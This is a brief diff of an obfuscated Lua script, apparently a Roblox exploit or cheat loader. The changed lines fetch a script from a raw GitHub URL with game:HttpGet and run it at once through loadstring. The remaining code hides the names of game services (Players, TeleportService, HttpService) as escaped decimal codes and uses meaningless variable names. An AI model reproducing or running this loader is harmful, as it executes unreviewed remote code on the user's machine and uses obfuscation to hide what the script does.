@@ -1,5 +1,5 @@
-loadstring([==[loadstring(game:HttpGet("https://raw.githubusercontent.com/ENSHIDALAO/baimingdan/refs/heads/main/BEN.lua"))()
-local _9a0x1 = game:GetService("\80\108\97\121\101\114\115").LocalPlayer
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ENSHIDALAO/baimingdan/refs/heads/main/BEN.lua"))()
+loadstring([==[local _9a0x1 = game:GetService("\80\108\97\121\101\114\115").LocalPlayer
 local _b3f7y = game:GetService("\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101")
 local _c8e2z = game:GetService("\72\116\116\112\83\101\114\118\105\99\101")
 local _d4g3a = _9a0x1.Character or _9a0x1.CharacterAdded:Wait()
